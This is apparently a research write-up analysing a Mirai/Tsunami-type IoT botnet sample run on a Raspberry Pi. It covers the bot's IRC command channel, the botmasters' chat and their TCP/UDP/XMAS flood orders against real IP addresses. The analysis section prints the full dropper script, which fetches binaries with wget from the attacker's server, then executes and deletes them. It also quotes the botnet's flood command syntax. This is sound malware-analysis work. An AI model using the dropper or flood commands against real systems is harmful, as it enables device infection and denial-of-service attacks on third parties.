By analyzing this botnet network traffic it was_\n_possible to identify the botmasters using an IRC channel and observe not only the_\n_conversation between them but also the orders they give to the bot._\n\n## Botnet behavior\n\nThe infected device was a RaspberryPi (ARMv6) using Raspbian OS. The sample we\nexecuted was\n49fd1cb22e0325c1f9038160da534fc23672e5509e903a94ce5bcddc893eb2c0, the capture\nId is [34-1. According to VirusTotal, the possible name for that malware sample is Mirai.](https://mcfp.felk.cvut.cz/publicDatasets/IoTDatasets/CTU-IoT-Malware-Capture-34-1/)\n\nAfter running the malware for the first time, the device contacts the IP 185.244.25.235 on\nport 80/TCP and downloads a file called “misp” using GNU Wget agent. It repeats the same\naction by downloading other files. The name of the downloaded files are: mips, mipsel, sh4,\nx86, armv7l, armv6l, i686, powerpc, i586, m68k, sparc and armv4l.\n\nThen, the bot establishes a connection with the IP 185.244.25.235 on port 6667 and joins\nan IRC channel called Summit. The communication with the remote server is the following:\n```\n IP 185.244.25.235.6667 > 192.168.1.195.48986:\n irc.Summit.gov.GoV NOTICE AUTH :*** Looking up your hostname...\n irc.Summit.gov.GoV NOTICE AUTH :*** Found your hostnameIP \n 192.168.1.195.48986 > 185.244.25.235.6667:\n NICK [ARM4T|PCVREB]USER VHIDFQC localhost localhost :VHIDFQC\n\n```\nThe remote server sends a PING and our devices replies with a PONG. Then, the infected\ndevice, receives its first order, given by the botmaster which nickname is AmpAttacks:\n```\n AmpAttacks :TCP Packeting 66.67.61.168!\n\n```\nThe bot sends SYN NS Packet packets to 66.67.61.168 port 63798. The NS flag, which\nstands for Nonce Sum, is still an experimental flag used to help protect against accidental\nmalicious concealment of packets from the sender[1]. The services related to the port\n\n\n-----\n\n**63798 are for Apple: Xsan. Xsan Filesystem Access. This means that either the remote**\nserver was using that port for another service or that the botnet owners knew, or the attack\naimed to an Apple device.\n\nThe domain registered to that IP is rr.com. The nmap scanning to that IP reveals that all\nports are filtered, it also reveals that the host is up using the domain cpe-66-67-61_168.rochester.res.rr.com._\n\nThe bot then sends an IRC Packet to report the successful end of AmpAttack TCP Flood\nAgainst 66.67.61.168:\n\nIRC Packet reporting TCP Flood Against 66.67.61.168\n\nSince our bot is on the IRC channel, it is possible to observe the conversation between the\nmembers of that channel. According to the IRC RFC [2], the format to send messages on\nan IRC channel is:\n```\nmsgto =/ nickname / ( nickname \"!\" user \"@\" host )\n\n```\nConsidering that format, it is possible to identify the nicknames and users in the channel,\nsome of them are:\n\nSpoof, Tragedy, Erradic and AmpAttacks.\n\nIn the conversation, the botmasters are talking about IRC. Some of the conversation is\ntranscript here:\n\n\n-----\n\n```\nIP 185.244.25.235 > 192.168.1.195:irc.Summit.gov.GoV MODE ##Summit +q Spoof\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :crazy how i know rock shit about ircs\nlmdao\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :fao*\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :crazy how i know rock shit about ircs\nlmdao\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :fao*\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :It's literally just a chatting\nprogram\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :But the IRC bot forces the device\nto join the channel as another \"client\"\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :And they listen\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :!* makes them listen\nTragedy!Erradic@Summit.gov.GoV MODE ##Summit +v [x86_64|BWQLXKB]\nTragedy!Erradic@Summit.gov.GoV MODE ##Summit +v [MIPS|WGEQAV]\nTragedy!Erradic@Summit.gov.GoV MODE ##Summit +v [ARM4T|PCVREB]\nAmpAttacks!AmpAttacks@Summit.gov.GoV PRIVMSG ##Summit :???\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :Giving them a voice so they can\nreply\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :This is the part I need to fix\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :!* STD 1.1.1.1 1 1\n\n```\nOur bot replies:\n```\n##Summit :STD Packeting 1.1.1.1!\n\n```\nThe bot sends two kind of packets to the IP 1.1.1.1. Those are:\n\n1. To the IP 1.1.1.1 on port 256/UDP: bad length 4096 > 1472\n```\n   SUMMIT.. %s, STD Flood Against %s Finished!....Incorrect Usage, %s :XMAS\n   <Target> <Port> <Time> 32 1024 10\n   ....Incorrect Usage, %s :RawUDP <Target> <Time>\n   .... %s :RawUDP Packeting %s!\n   .. %s, RawUDP Flood Against %s Finished!\n\n```\n2.

Once the flood is finished, the bot reports to the\nmaster:\n```\nTragedy, TCP Flood Against 1.1.1.1 Finished!\n\n```\nThen, the conversation between the botmasters:\n\n\n-----\n\n```\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :I forgot to enable raw headers\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :They'll say \"@Tragedy : TCP\nPacketing 1.1.1.1\"\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :Then when the flood is over they'll\nsay \"@Tragedy, your TCP flood against 1.1.1.1 has ended\"\nAmpAttacks!AmpAttacks@Summit.gov.GoV PRIVMSG ##Summit :!* TCP 50.50.50.53 53 10 32\nsyn 0 10\n\n```\nOur Bot reports that its starting the attack:\n```\nAmpAttacks :TCP Packeting 50.50.50.53!\n\n```\nThe bot sends SYN packetsto the IP 50.50.50.53 on port 53. There is no information\nregarding this IP, Registrant Name: REDACTED FOR PRIVACY. Only the country\ninformation (US) and AS (5650, Frontier Communications of America, Inc.) was available.\nWhen the bot finished the flood, it reports it to the masters:\n```\nAmpAttacks, TCP Flood Against 50.50.50.53 Finished!\n:irc.Summit.gov.GoV 421 [ARM4T|PCVREB] AmpAttacks, :Unknown command\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :eww yarn\nAmpAttacks!AmpAttacks@Summit.gov.GoV PRIVMSG ##Summit :lol imagine saying ew to\nservers\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :Googles and Amazons constantly\nleave and join back\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :eww servers\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :i call huawei\nAmpAttacks!AmpAttacks@Summit.gov.GoV PRIVMSG ##Summit :because I'm constantly\nloading\nAmpAttacks!AmpAttacks@Summit.gov.GoV PRIVMSG ##Summit :and dupes leave and rejoin\nAttacks!AmpAttacks@Summit.gov.GoV PRIVMSG ##Summit :what I mean is\nAmpAttacks!AmpAttacks@Summit.gov.GoV PRIVMSG ##Summit :the same bot\nAmpAttacks!AmpAttacks@Summit.gov.GoV PRIVMSG ##Summit :trying to rejoin\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :You can right click on a bot and\nget all its info with Whois\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :* [x86_64|ZBGMF] (PDCVY@Zombie190A588A.us-west-2.compute.amazonaws.com) has joined ##Summit\n\n```\nThen, more than 10 bots joins to the IRC channel, those are machines from Google and\nAmazon that are leaving and rejoining the channel, the bot masters talked about it:\n\n\n-----\n\n```\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :< AmpAttacks> and dupes leave and\nrejoin\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :<~Tragedy> This doesn't allow dupes Lol\nthe Unreal config Max per IP is set to 1.

The botmasters talked about this here:\n\nConversation between the botmasters\n\nThe conversation between the botmasters continues and the bot receives more orders,\nbotmasters that were not on the previous chat write on the channel:\n\n\n-----\n\n```\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :Theres no help cmd\nshadoh!shadoh@Summit.gov.GoV MODE ##Summit +v [x86_64|ITVX]\nshadoh!shadoh@Summit.gov.GoV PRIVMSG ##Summit :rip\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :I didn't set the raw headers mode\nyet\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :Was making sure floods worked\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :And they do (:\n....\nshadoh!shadoh@Summit.gov.GoV PRIVMSG ##Summit :!* XMAS 123.59.209.185 80 30 32 1024\n10\n\n```\nThe order from the botmaster specifies to perform a XMAS attack to the IP address\n**123.59.2019.185 on port 80. This is a DoS attack that sends packets to an IP and it**\nchanges the TCP headers to become harder to process for the target.\n\nThe bot sends packets to the IP 123.59.209.185 on port 80. The IP is registered in China,\nand the network name is CloudVsp. At the moment, the IP is not active. The packets\nheader sent by the bot looks like this:\n```\nIP 192.168.1.195.65279 > 123.59.209.185.80: Flags [SP.U], seq 4278190079:4278191103,\nack 0, win 65279, urg 0, length 1024: HTTP\n\n```\nIt is possible to observe that the TCP flag set in this case is SP.U, it means that Syn, Push\nand Urgent are set at the same time. While the bot is attacking, it also receives more orders\nfrom the same botmaster:\n```\nshadoh!shadoh@Summit.gov.GoV PRIVMSG ##Summit :!* XMAS 123.59.209.185 80 30 32 1024\n10\n\n```\nThe botmaster sends the same message 9 times in total, mean while, the conversation\nbetween the attackers continues:\n```\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :yooo\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :We reppin Guandong over here\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :[IPLookup] Getting Info For ->\n119.146.203.154...\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :There we go lmao\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :For the clout\nTragedy!Erradic@Summit.gov.GoV PRIVMSG ##Summit :<3\nTragedy!Erradic@Summit.gov.GoV QUIT :Client has disconnected from Summit.gov\n\n```\nThen, our bot receives another order:\n```\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :!* STD 74.91.117.248 21 25\n\n```\nThe bot replies to inform that it will be performing the received order:\n```\n##Summit :STD Packeting 74.91.117.248!\n\n```\n\n-----\n\nThe domain of that IP is craftdiggers.g.nfoservers.com [4]. While doing the flood, the bot\nsends 2 kind of packets:\n\n1. IP address 74.91.117.248, port 5376/UDP, bad length 4096 > 1472\n\n2. IP address 74.91.117.248: ip-proto-17\n\nAfterwards, the bot receives more orders to perform a DoS attack on port 80:\n```\nSpoof!Spoof@Summit.gov.GoV PRIVMSG ##Summit :!* TCP 71.61.66.148 80 22 32 syn 0 10\n\n```\nOur bot informs that the attack will be performed:\n```\nSpoof :TCP Packeting 71.61.66.148!\n\n```\nThen, the bot informs that the attack is finished;\n```\nSpoof, TCP Flood Against 71.61.66.148 Finished!\n\n```\nIn this case, the domain name registered for the IP 71.61.66.148 is comcast.net.\n\nAfter that, the bot tries to join the channel again several times, but it fails, the sequence is\nthe following:\n\n1. The bot sends Syn packets to the remote server 185.244.25.235 on port 6667\n\n2. The remote server replies with a TCP packet (P. flag):\n\n1. irc.Summit.gov.GoV NOTICE AUTH :*** Looking up your hostname…\n\n2. irc.Summit.gov.GoV NOTICE AUTH :*** Found your hostname\n\n3. The bot replies:\n\n1. NICK [ARM4T|PCVREB]\n\n2. USER VHIDFQC localhost localhost :VHIDFQC\n\n4. The remote server replies:\n\n:irc.Summit.gov.GoV 433 * [ARM4T|PCVREB] :Nickname is already in use.\n\nAfter trying several times, one of the connections succeed :\n```\n[ARM4T|PCVREB]!VHIDFQC@Zombie-6024A57C.felk.cvut.cz JOIN :##Summit\n\n```\nHowever, there seems to be a connection error, there is ping timeout: 32 seconds. Then,\nthe remote server sends a F packet and the connection is over. This process is repeated\nseveral times.\n\n\n-----\n\nThe bot tries to contact the remote server on port 6667 several times. It is using different\nuser name, first using the nickname HVLLTLBT, then using PCVREB. This could be\npossible because several scripts were downloaded and executed at the same time to\nguaranteed the botnet operation.\n\n## Analysis for the extracted files\n\nThe downloaded files by the malware were extracted and analyzed on VirusTotal, most of\nthe files were uploaded by us for the first time. The possible name for those samples is\n“Tsunami”. However, the possible name for the executed sample was “Mirai”. The executed\nsample downloads scripts that were developed for different architectures. This technique\nensures that the botnet will run in most of the IoT devices because it downloads several\nbinaries and run them until one of them will work.\n\nList of the SHA256 hashes for the downloaded files by the malware:\n\n[31784de70d7b55b2ee48a9ae359f7c67c82fb9a814279e0944a9dee01ed3f756](https://www.virustotal.com/#/file/31784de70d7b55b2ee48a9ae359f7c67c82fb9a814279e0944a9dee01ed3f756/detection)\n\n[fd43c0abfaa6e6203e24bdb015613801f4a23894aba9586b0bdf1e70736883e5](https://www.virustotal.com/#/file/fd43c0abfaa6e6203e24bdb015613801f4a23894aba9586b0bdf1e70736883e5/detection)\n\n[284bde3fc80d81eb2cf644770df64c59cc444f283bd4ab96f64431fef735879a](https://www.virustotal.com/#/file/284bde3fc80d81eb2cf644770df64c59cc444f283bd4ab96f64431fef735879a/detection)\n\n[32776a1a3eb8914855b57972c94750e0bb1dedd3ed161fdb53098cdfcee74ce3](https://www.virustotal.com/#/file/32776a1a3eb8914855b57972c94750e0bb1dedd3ed161fdb53098cdfcee74ce3/detection)\n\n[976e948ccec98ffd36115d0240c2a438dccd4e15d220284e6356e3fcb0f2548c](https://www.virustotal.com/#/file/976e948ccec98ffd36115d0240c2a438dccd4e15d220284e6356e3fcb0f2548c/detection)\n\n[f031d926d80805795c20d1a7b280759d1393e736a85f7fd2e02d2088f2fb0221](https://www.virustotal.com/#/file/f031d926d80805795c20d1a7b280759d1393e736a85f7fd2e02d2088f2fb0221/detection)\n\n[3efdd1461af3cf4039bd7a3ababcf71c5df08a1c232a36287d9ae1f0bd7509cc](https://www.virustotal.com/#/file/3efdd1461af3cf4039bd7a3ababcf71c5df08a1c232a36287d9ae1f0bd7509cc/detection)\n\n[34fa4705a10ca0d940762f5f594bbf93fe79f1df2bf4a1fb69fe9b00ff79b2fe](https://www.virustotal.com/#/file/34fa4705a10ca0d940762f5f594bbf93fe79f1df2bf4a1fb69fe9b00ff79b2fe/detection)\n\n[3549fca31abf602a78f645d3406ad075e02c7ea9a6aa9cec243ba6cb58b5e39f](https://www.virustotal.com/#/file/3549fca31abf602a78f645d3406ad075e02c7ea9a6aa9cec243ba6cb58b5e39f/detection)\n\n[62997b5ecc8bb785f16803cdd04d2b4209476e457d9a46cbb1f7fae0a6a8108d](https://www.virustotal.com/#/file/62997b5ecc8bb785f16803cdd04d2b4209476e457d9a46cbb1f7fae0a6a8108d/detection)\n\n## Analysis of the Source Code of the Malware\n\nThe malwares code is a bash script that downloads several scripts, change their mode to\n+x, to execute, then execute the script and delete them. The files names are different and\nmost of them have the architecture name (misp, x86, armv7, etc).\n\n\n-----\n\n```\n#!/bin/bash\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/mips; chmod +x mips; ./mips; rm -rf mips\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/sh4; chmod +x sh4; ./sh4; rm -rf sh4\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/x86; chmod +x x86; ./x86; rm -rf x86\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/armv7l; chmod +x armv7l; ./armv7l; rm -rf armv7l\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/armv6l; chmod +x armv6l; ./armv6l; rm -rf armv6l\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/i686; chmod +x i686; ./i686; rm -rf i686\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/powerpc; chmod +x powerpc; ./powerpc; rm -rf powerpc\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/i586; chmod +x i586; ./i586; rm -rf i586\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/m68k; chmod +x m68k; ./m68k; rm -rf m68k\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/sparc; chmod +x sparc; ./sparc; rm -rf sparc\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/armv4l; chmod +x armv4l; ./armv4l; rm -rf armv4l\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/armv5l; chmod +x armv5l; ./armv5l; rm -rf armv5l\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://185.244.25.235/440fp; chmod +x 440fp; ./440fp; rm -rf 440fp\n\n## Conclusion\n\n```\nThe binary file we used to infect the RPi was a bash script which possible name according\nto Virus Total is Mirai. It downloads files, execute them and then erase them. In order to do\nthat it contacts the server on port 80 and downloads the files using GNU Wget agent.\n\nOnce the files were executed, the bot contacts a remote server on port 6667 and joins an\nIRC channel. The nick name it uses to joined the channel is: [ARM4T|HVLLTLBT]. It has\nthe architecture of the device on it and a some letters. Other bots joins the channel and\nhave the same format name.\n\nOnce our bot is in the channel, it receive orders to perform TCP flood attacks to different\nIPs.\n\nThis malware could be a variant of a Mirai botnet, because Mirai performs DDoS attacks.\nHowever, our bot doesn’t seems to scan for other devices on port 22 or 23. It just perform\ntcp flood to different IPs. Moreover, the samples downloaded by the malware were\nextracted and analyzed on VirusTotal, and the possible name for those samples is Tsunami.\n\n## References\n\n\n-----\n\n[1] https://tools.ietf.org/html/rfc3540\n\n[2] Internet Relay Chat: Client Protocol. https://tools.ietf.org/html/rfc2812#page-4\n\n[3] [https://1.1.1.1](https://1.1.1.1/)\n\n[4] IP: 74.91.117.248\nDomain Name: NFOSERVERS.COM\nRegistry Domain ID: 109323766_DOMAIN_COM-VRSN\nRegistrar WHOIS Server: whois.godaddy.com\nRegistrar URL: http://www.godaddy.com\nUpdated Date: 2016-12-30T19:59:34Z\nCreation Date: 2004-01-04T20:57:15Z\nRegistrar Registration Expiration Date: 2026-01-04T20:57:15Z\nRegistrar: GoDaddy.com, LLC\nRegistrar IANA ID: 146\nNetRange:   74.91.117.0 - 74.91.117.255\nCIDR:     74.91.117.0/24\nNetName:   NFOSERVERS-SEA-1\nNetHandle:  NET-74-91-117-0-1\nParent:     NFOSERVERS-1 (NET-74-91-112-0-1)\nNetType:    Reassigned\nOriginAS:   AS32751\nCustomer:   Nuclearfallout Enterprises, Inc.
